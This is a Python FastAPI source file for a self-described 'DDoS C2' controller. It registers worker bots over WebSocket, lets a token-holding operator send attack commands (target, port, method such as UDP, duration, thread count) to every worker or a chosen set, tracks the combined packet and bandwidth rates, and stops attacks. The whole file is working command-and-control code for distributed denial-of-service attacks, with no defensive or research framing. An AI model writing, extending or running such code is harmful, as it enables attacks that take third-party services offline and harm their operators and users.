"""
DDoS C2 — central controller
Workers connect via WebSocket, commands dispatched via REST.
"""
import asyncio
import json
import secrets
import time
import uuid
from datetime import datetime
from pathlib import Path

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Header, Depends
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field

CONFIG = json.loads((Path(__file__).parent / "config.json").read_text())
ADMIN_TOKEN = CONFIG["admin_token"]


# ---------- worker registry ----------
class Worker:
    def __init__(self, ws, wid, info):
        self.ws = ws
        self.id = wid
        self.info = info          # {ip, region, cores, bandwidth_mbps}
        self.status = "idle"      # idle | attacking
        self.stats = {"pps": 0, "bps": 0}
        self.last_seen = time.time()

    def to_dict(self):
        return {
            "id": self.id,
            "info": self.info,
            "status": self.status,
            "stats": self.stats,
            "last_seen": self.last_seen,
        }


workers: dict[str, Worker] = {}
attacks: dict[str, dict] = {}


app = FastAPI(title="DDoS C2")


def auth(authorization: str = Header(None)):
    if not authorization or authorization != f"Bearer {ADMIN_TOKEN}":
        raise HTTPException(401, "bad token")
    return True


# ---------- REST ----------
class AttackReq(BaseModel):
    target: str
    port: int = 80
    method: str = "udp"
    duration: int = Field(default=60, le=3600)
    threads: int = Field(default=500, le=5000)
    workers: list[str] | None = None     # None = all
    name: str = ""


@app.get("/api/workers")
async def list_workers(_=Depends(auth)):
    return [w.to_dict() for w in workers.values()]


@app.post("/api/attack")
async def start_attack(req: AttackReq, _=Depends(auth)):
    aid = uuid.uuid4().hex[:12]
    cmd = {
        "cmd": "attack",
        "id": aid,
        "target": req.target,
        "port": req.port,
        "method": req.method,
        "duration": req.duration,
        "threads": req.threads,
    }
    targets = req.workers or list(workers.keys())
    targets = [t for t in targets if t in workers]

    if not targets:
        raise HTTPException(400, "no workers available")

    dispatched = []
    for wid in targets:
        w = workers[wid]
        try:
            await w.ws.send_json(cmd)
            w.status = "attacking"
            dispatched.append(wid)
        except Exception as e:
            print(f"[dispatch] {wid} failed: {e}")

    attacks[aid] = {
        "id": aid,
        "target": req.target,
        "port": req.port,
        "method": req.method,
        "duration": req.duration,
        "threads": req.threads,
        "started": datetime.utcnow().isoformat(),
        "workers": dispatched,
        "status": "running",
        "name": req.name,
    }
    asyncio.create_task(_auto_finish(aid, req.duration))
    return attacks[aid]


@app.post("/api/stop/{aid}")
async def stop_attack(aid: str, _=Depends(auth)):
    a = attacks.get(aid)
    if not a:
        raise HTTPException(404, "attack not found")
    cmd = {"cmd": "stop", "id": aid}
    for wid in a["workers"]:
        w = workers.get(wid)
        if w:
            try:
                await w.ws.send_json(cmd)
                w.status = "idle"
            except Exception:
                pass
    a["status"] = "stopped"
    return a


@app.get("/api/attacks")
async def list_attacks(_=Depends(auth)):
    return list(attacks.values())


@app.get("/api/total")
async def total_stats(_=Depends(auth)):
    t_pps = sum(w.stats.get("pps", 0) for w in workers.values())
    t_bps = sum(w.stats.get("bps", 0) for w in workers.values())
    return {
        "workers": len(workers),
        "attacking": sum(1 for w in workers.values() if w.status == "attacking"),
        "total_pps": t_pps,
        "total_bps": t_bps,
        "total_gbps": t_bps * 8 / 1e9,
    }


async def _auto_finish(aid: str, duration: int):
    await asyncio.sleep(duration + 5)
    a = attacks.get(aid)
    if a and a["status"] == "running":
        a["status"] = "finished"
        for wid in a["workers"]:
            w = workers.get(wid)
            if w:
                w.status = "idle"


# ---------- WebSocket ----------
@app.websocket("/ws/worker")
async def ws_worker(ws: WebSocket):
    await ws.accept()
    wid = None
    try:
        # handshake
        hello = await ws.receive_json()
        if hello.get("type") != "hello":
            await ws.close()
            return
        wid = hello.get("id") or f"w_{secrets.token_hex(4)}"
        info = hello.get("info", {})
        w = Worker(ws, wid, info)
        workers[wid] = w
        print(f"[+] worker {wid} connected: {info}")

        await ws.send_json({"type": "welcome", "id": wid})

        while True:
            msg = await ws.receive_json()
            w.last_seen = time.time()

            t = msg.get("type")
            if t == "stats":
                w.stats["pps"] = msg.get("pps", 0)
                w.stats["bps"] = msg.get("bps", 0)
            elif t == "done":
                w.status = "idle"
            elif t == "ping":
                await ws.send_json({"type": "pong"})

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[ws] error: {e}")
    finally:
        if wid and wid in workers:
            del workers[wid]
            print(f"[-] worker {wid} disconnected")


# ---------- UI ----------
@app.get("/", response_class=HTMLResponse)
async def index():
    p = Path(__file__).parent / "static" / "index.html"
    if p.exists():
        return p.read_text()
    return "<h1>C2 running</h1>"


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=CONFIG.get("port", 9000))